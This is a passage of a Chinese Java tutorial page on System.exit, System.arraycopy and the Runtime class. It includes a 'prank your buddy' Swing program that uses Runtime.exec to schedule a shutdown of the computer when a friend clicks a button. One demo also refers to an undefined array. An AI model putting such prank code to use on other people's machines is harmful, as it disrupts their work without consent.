Math.sqrt(number); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="案例2：演示exit方法"><a class="header-anchor" href="#案例2：演示exit方法">¶</a>案例2：演示exit方法</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(<span class="string">&quot;程序开始执行了.....&quot;</span>);</span><br><span class="line">        <span class="comment">// 终止JVM</span></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(<span class="string">&quot;程序终止了..........&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>控制台只输出了&quot;程序开始了…&quot;，由于JVM终止了，因此输出&quot;程序终止了…&quot;这段代码没有被执行</li>
</ul>
<h5 id="案例3：演示arraycopy方法"><a class="header-anchor" href="#案例3：演示arraycopy方法">¶</a><strong>案例3</strong>：演示arraycopy方法</h5>
<ul>
<li>方法参数说明</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src:          源数组</span></span><br><span class="line"><span class="comment">// srcPos：  源数值的开始位置</span></span><br><span class="line"><span class="comment">// dest：    目标数组</span></span><br><span class="line"><span class="comment">// destPos： 目标数组开始位置</span></span><br><span class="line"><span class="comment">// length:   要复制的元素个数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">arraycopy</span><span class="params">(Object src,  <span class="type">int</span>  srcPos, Object dest, <span class="type">int</span> destPos, <span class="type">int</span> length)</span>; </span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义源数组</span></span><br><span class="line">        <span class="type">int</span>[] srcArray = &#123;<span class="number">23</span> , <span class="number">45</span> , <span class="number">67</span> , <span class="number">89</span> , <span class="number">14</span> , <span class="number">56</span> &#125; ;</span><br><span class="line">        <span class="comment">// 定义目标数组</span></span><br><span class="line">        <span class="type">int</span>[] desArray = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>] ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行数组元素的copy: 把srcArray数组中从0索引开始的3个元素，从desArray数组中的1索引开始复制过去</span></span><br><span class="line">        System.arraycopy(srcArray , <span class="number">0</span> , desArray , <span class="number">1</span> , <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历目标数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span> ; x &lt; desArray.length ; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(x != desArray.length - <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print(desArray[x] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(desArray[x]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 0, 23, 45, 67, 0, 0, 0, 0, 0, 0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以用这个函数完成数组元素的删除操作</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一次尝试</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个数组</span></span><br><span class="line">        <span class="type">int</span>[] srcArray = &#123;<span class="number">23</span> , <span class="number">45</span> , <span class="number">67</span> , <span class="number">89</span> , <span class="number">14</span> , <span class="number">56</span> &#125; ;</span><br><span class="line">        <span class="comment">// 删除数组中第3个元素(67)：要删除67这个元素，我们只需要将67后面的其他元素依次向前进行移动即可</span></span><br><span class="line">        System.arraycopy(srcArray , <span class="number">3</span> , srcArray , <span class="number">2</span> , <span class="number">3</span>);</span><br><span class="line">        <span class="comment">// 遍历srcArray数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span> ; x &lt; srcArray.length ; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(x != desArray.length - <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print(srcArray[x] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(srcArray[x]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 得到结果：23, 45, 89, 14, 56, 56 </span></span><br><span class="line"><span class="comment">// 多了一个56 所以要手动把最后一位设置为0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二次尝试（第一次尝试的完善）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个数组</span></span><br><span class="line">        <span class="type">int</span>[] srcArray = &#123;<span class="number">23</span> , <span class="number">45</span> , <span class="number">67</span> , <span class="number">89</span> , <span class="number">14</span> , <span class="number">56</span> &#125; ;</span><br><span class="line">        <span class="comment">// 删除数组中第3个元素(67)：要删除67这个元素，我们只需要将67后面的其他元素依次向前进行移动即可</span></span><br><span class="line">        System.arraycopy(srcArray , <span class="number">3</span> , srcArray , <span class="number">2</span> , <span class="number">3</span>);</span><br><span class="line">        <span class="comment">// 将最后一个位置的元素设置为0</span></span><br><span class="line">        srcArray[srcArray.length - <span class="number">1</span>] = <span class="number">0</span> ;</span><br><span class="line">        <span class="comment">// 遍历srcArray数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span> ; x &lt; srcArray.length ; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(x != srcArray.length - <span class="number">1</span> ) &#123;</span><br><span class="line">                System.out.print(srcArray[x] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(srcArray[x]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 元素&quot;67&quot;已经被删除掉了。67后面的其他元素依次向前进行移动了一位</span></span><br></pre></td></tr></table></figure>
<h5 id="arraycopy方法底层细节"><a class="header-anchor" href="#arraycopy方法底层细节">¶</a>arraycopy方法底层细节</h5>
<ol>
<li>如果数据源数组和目的地数组都是基本数据类型，那么两者的<strong>类型必须保持一致</strong>，否则会报错</li>
<li>在拷贝的时候需要考虑<strong>数组的长度</strong>，如果超出范围也会报错</li>
<li>如果数据源数组和目的地数组都是<strong>引用数据类型</strong>，那么子类类型<strong>可以赋值</strong>给父类类型</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//public static void arraycopy(数据源数组，起始索引，目的地数组，起始索引，拷贝个数) 数组拷贝</span></span><br><span class="line">        <span class="comment">//细节:</span></span><br><span class="line">        <span class="comment">//1.如果数据源数组和目的地数组都是基本数据类型，那么两者的类型必须保持一致，否则会报错</span></span><br><span class="line">        <span class="comment">//2.在拷贝的时候需要考虑数组的长度，如果超出范围也会报错</span></span><br><span class="line">        <span class="comment">//3.如果数据源数组和目的地数组都是引用数据类型，那么子类类型可以赋值给父类类型</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;zhangsan&quot;</span>, <span class="number">23</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;lisi&quot;</span>, <span class="number">24</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;wangwu&quot;</span>, <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        Student[] arr1 = &#123;s1, s2, s3&#125;;</span><br><span class="line">        Person[] arr2 = <span class="keyword">new</span> <span class="title class_">Person</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="comment">//把arr1中对象的地址值赋值给arr2中</span></span><br><span class="line">        System.arraycopy(arr1, <span class="number">0</span>, arr2, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组arr2</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr2.length; i++) &#123;</span><br><span class="line">            <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> (Student) arr2[i];</span><br><span class="line">            System.out.println(stu.getName() + <span class="string">&quot;,&quot;</span> + stu.getAge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name = &quot;</span> + name + <span class="string">&quot;, age = &quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Runtime"><a class="header-anchor" href="#Runtime">¶</a>Runtime</h3>
<ul>
<li>Runtime表示Java中运行时对象，可以获取到程序运行时设计到的一些信息</li>
</ul>
<h4 id="常见方法-v3"><a class="header-anchor" href="#常见方法-v3">¶</a>常见方法</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span>    <span class="comment">//当前系统的运行环境对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span>          <span class="comment">//停止虚拟机</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">availableProcessors</span><span class="params">()</span>      <span class="comment">//获得CPU的线程数</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maxMemory</span><span class="params">()</span>               <span class="comment">//JVM能从系统中获取总内存大小（单位byte）</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">totalMemory</span><span class="params">()</span>             <span class="comment">//JVM已经从系统中获取总内存大小（单位byte）</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">freeMemory</span><span class="params">()</span>              <span class="comment">//JVM剩余内存大小（单位byte）</span></span><br><span class="line"><span class="keyword">public</span> Process <span class="title function_">exec</span><span class="params">(String command)</span>   <span class="comment">//运行cmd命令</span></span><br></pre></td></tr></table></figure>
<ul>
<li>代码示例</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunTimeDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            public static Runtime getRuntime() 当前系统的运行环境对象</span></span><br><span class="line"><span class="comment">            public void exit(int status) 停止虚拟机</span></span><br><span class="line"><span class="comment">            public int availableProcessors() 获得CPU的线程数</span></span><br><span class="line"><span class="comment">            public long maxMemory() JVM能从系统中获取总内存大小(单位byte)</span></span><br><span class="line"><span class="comment">            public long totalMemory() JVM已经从系统中获取总内存大小(单位byte)</span></span><br><span class="line"><span class="comment">            public long freeMemory() JVM剩余内存大小(单位byte)</span></span><br><span class="line"><span class="comment">            public Process exec(string command) 运行cmd命令</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取Runtime的对象</span></span><br><span class="line">        <span class="comment">//Runtime r1 =Runtime.getRuntime();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.exit 停止虚拟机</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exit(0);</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;看看我执行了吗?&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获得CPU的线程数</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().availableProcessors());<span class="comment">//8</span></span><br><span class="line">        <span class="comment">//4.总内存大小,单位byte字节</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().maxMemory() / <span class="number">1024</span> / <span class="number">1024</span>);<span class="comment">//4064</span></span><br><span class="line">        <span class="comment">//5.已经获取的总内存大小,单位byte字节</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().totalMemory() / <span class="number">1024</span> / <span class="number">1024</span>);<span class="comment">//254</span></span><br><span class="line">        <span class="comment">//6.剩余内存大小</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().freeMemory() / <span class="number">1024</span> / <span class="number">1024</span>);<span class="comment">//251</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//7.运行cmd命令</span></span><br><span class="line">        <span class="comment">//shutdown :关机</span></span><br><span class="line">        <span class="comment">//加上参数才能执行</span></span><br><span class="line">        <span class="comment">//-s :默认在1分钟之后关机</span></span><br><span class="line">        <span class="comment">//-s -t 指定时间 : 指定关机时间</span></span><br><span class="line">        <span class="comment">//-a :取消关机操作</span></span><br><span class="line">        <span class="comment">//-r: 关机并重启</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;shutdown -s -t 3600&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：恶搞好基友"><a class="header-anchor" href="#案例：恶搞好基友">¶</a>案例：恶搞好基友</h4>
<ul>
<li>**需求：**界面上方按钮默认隐藏，界面中间有一个提示文本和三个按钮，当你的好基友点击中间三个按钮的时候就在N秒之后关机，不同的按钮N的值不一样，任意一个按钮被点击之后，上方了按钮出现。当点击上方按钮之后取消关机任务</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyJframe</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyJframe</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">JButton</span> <span class="variable">yesBut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;帅爆了&quot;</span>);</span><br><span class="line">    <span class="type">JButton</span> <span class="variable">midBut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;一般般吧&quot;</span>);</span><br><span class="line">    <span class="type">JButton</span> <span class="variable">noBut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;不帅，有点磕碜&quot;</span>);</span><br><span class="line">    <span class="type">JButton</span> <span class="variable">dadBut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;饶了我吧！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//决定了上方的按钮是否展示</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyJframe</span><span class="params">()</span> &#123;</span><br><span class="line">        initJFrame();</span><br><span class="line"></span><br><span class="line">        initView();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//显示</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initView</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="comment">//展示按钮</span></span><br><span class="line">            dadBut.setBounds(<span class="number">50</span>, <span class="number">20</span>, <span class="number">100</span>, <span class="number">30</span>);</span><br><span class="line">            dadBut.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(dadBut);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">text</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;你觉得自己帅吗？&quot;</span>);</span><br><span class="line">        text.setFont(<span class="keyword">new</span> <span class="title class_">Font</span>(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">0</span>, <span class="number">30</span>));</span><br><span class="line">        text.setBounds(<span class="number">120</span>, <span class="number">150</span>, <span class="number">300</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">        yesBut.setBounds(<span class="number">200</span>, <span class="number">250</span>, <span class="number">100</span>, <span class="number">30</span>);</span><br><span class="line">        midBut.setBounds(<span class="number">200</span>, <span class="number">325</span>, <span class="number">100</span>, <span class="number">30</span>);</span><br><span class="line">        noBut.setBounds(<span class="number">160</span>, <span class="number">400</span>, <span class="number">180</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        yesBut.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">        midBut.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">        noBut.addActionListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(text);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(yesBut);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(midBut);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(noBut);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().repaint();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">500</span>, <span class="number">600</span>);</span><br><span class="line">        <span class="comment">//设置标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;恶搞好基友&quot;</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//取消内部默认布局</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> e.getSource();</span><br><span class="line">        <span class="keyword">if</span> (obj == yesBut) &#123;</span><br><span class="line">            <span class="comment">//给好基友一个弹框</span></span><br><span class="line">            showJDialog(<span class="string">&quot;xxx，你太自信了，给你一点小惩罚&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;shutdown -s -t 3600&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            initView();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj == midBut) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你的好基友点击了一般般吧&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//给好基友一个弹框</span></span><br><span class="line">            showJDialog(<span class="string">&quot;xxx，你还是太自信了，也要给你一点小惩罚&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;shutdown -s -t 7200&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            initView();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj == noBut) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你的好基友点击了不帅&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//给好基友一个弹框</span></span><br><span class="line">            showJDialog(<span class="string">&quot;xxx，你还是有一点自知之明的，也要给你一点小惩罚&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;shutdown -s -t 1800&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">true</span>;</span><br><span class="line">            initView();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj == dadBut) &#123;</span><br><span class="line">            <span class="comment">//给好基友一个弹框</span></span><br><span class="line">            showJDialog(<span class="string">&quot;xxx，这次就饶了你~&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;shutdown -a&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioException) &#123;</span><br><span class="line">                ioException.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showJDialog</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="comment">//创建一个弹框对象</span></span><br><span class="line">        <span class="type">JDialog</span> <span class="variable">jDialog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JDialog</span>();</span><br><span class="line">        <span class="comment">//给弹框设置大小</span></span><br><span class="line">        jDialog.setSize(<span class="number">200</span>, <span class="number">150</span>);</span><br><span class="line">        <span class="comment">//让弹框置顶</span></span><br><span class="line">        jDialog.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//让弹框居中</span></span><br><span class="line">        jDialog.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//弹框不关闭永远无法操作下面的界面</span></span><br><span class="line">        jDialog.setModal(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Jlabel对象管理文字并添加到弹框当中</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">warning</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(content);</span><br><span class="line">        warning.setBounds(<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">150</span>);</span><br><span class="line">        jDialog.getContentPane().add(warning);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//让弹框展示出来</span></span><br><span class="line">        jDialog.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Object类"><a class="header-anchor" href="#Object类">¶</a>Object类</h3>
<ul>
<li>Object类所在包是java.lang包</li>
<li>Object 是类层次结构的根，每个类都可以将 Object 作为超类。所有类都直接或者间接的继承自该类；换句话说，该类所具备的方法，其他所有类都继承了</li>
<li>Object类中提供了一个无参构造方法Object()</li>
<li><strong>类Object是类层次结构的根类，每个类都使用Object作为超类，所有对象（包括数组）都实现这个类的方法</strong></li>
</ul>
<h4 id="常见方法-v4"><a class="header-anchor" href="#常见方法-v4">¶</a>常见方法</h4>
